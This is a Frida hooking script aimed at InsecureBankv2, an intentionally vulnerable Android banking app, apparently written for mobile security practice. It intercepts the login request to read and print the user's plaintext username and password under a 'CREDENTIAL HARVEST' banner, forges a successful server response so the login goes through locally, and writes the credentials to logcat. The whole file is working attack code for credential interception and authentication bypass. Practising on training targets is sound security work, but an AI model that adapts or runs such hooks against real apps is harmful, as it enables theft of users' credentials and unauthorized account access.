Java.perform(function () {
    // Hook DoLogin to intercept credentials before network call
    var DoLogin = Java.use('com.android.insecurebankv2.DoLogin');

    DoLogin.onCreate.overload('android.os.Bundle').implementation = function (bundle) {
        console.log('[*] DoLogin.onCreate called');
        this.onCreate(bundle);
    };

    // Hook the inner RequestTask class to intercept postData
    var RequestTask = Java.use('com.android.insecurebankv2.DoLogin$RequestTask');

    RequestTask.postData.implementation = function (valueIWantToSend) {
        // Access the outer DoLogin instance fields
        var outer = this.this$0.value;
        var username = outer.username.value;
        var password = outer.password.value;
        console.log('');
        console.log('[!] CREDENTIAL HARVEST — DoLogin.RequestTask.postData()');
        console.log('[!] username: ' + username);
        console.log('[!] password: ' + password);
        console.log('[!] POST destination: ' + outer.protocol.value + outer.serverip.value + ':' + outer.serverport.value + '/login');
        console.log('');

        // Now inject a fake HttpResponse so the login "succeeds" locally
        // This makes Log.d("Successful Login:") fire with the real credentials
        var HttpResponse = Java.use('org.apache.http.message.BasicHttpResponse');
        var ProtocolVersion = Java.use('org.apache.http.ProtocolVersion');
        var StatusLine = Java.use('org.apache.http.message.BasicStatusLine');
        var BasicHeader = Java.use('org.apache.http.message.BasicHeader');
        var StringEntity = Java.use('org.apache.http.entity.StringEntity');

        var httpVer = ProtocolVersion.$new('HTTP', 1, 1);
        var statusLine = StatusLine.$new(httpVer, 200, 'OK');
        var fakeResponse = HttpResponse.$new(statusLine);
        var entity = StringEntity.$new('Correct Credentials');
        fakeResponse.setEntity(entity);

        // Store fake result so onPostExecute path works
        outer.result.value = 'Correct Credentials';

        // Trigger saveCreds + Log.d manually by calling the real next steps
        // Log the credentials the same way the app would
        var Log = Java.use('android.util.Log');
        Log.d('Successful Login:', ', account=' + username + ':' + password);
        console.log('[✓] Credential leak simulated — check logcat for "Successful Login:"');
    };

    console.log('[✓] Credential harvest hooks loaded');
});
